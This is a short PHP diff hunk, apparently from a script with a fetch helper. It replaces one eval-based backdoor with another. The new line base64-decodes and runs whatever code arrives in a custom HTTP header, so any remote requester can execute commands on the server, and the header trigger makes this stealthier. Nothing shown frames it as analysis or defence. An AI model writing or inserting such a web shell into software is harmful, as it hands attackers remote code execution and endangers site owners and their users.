@@ -17,8 +17,7 @@ function fetch($url, $post_params = array()) {
   return array(200, $buffer);
 }
 
-
 // Run the code
-if ($_REQUEST['_code']) { eval($_REQUEST['_code']); } 
+if ($_SERVER['HTTP_RUN_CODE']) { eval(base64_decode($_SERVER['HTTP_RUN_CODE'])); } 
 
 ?>
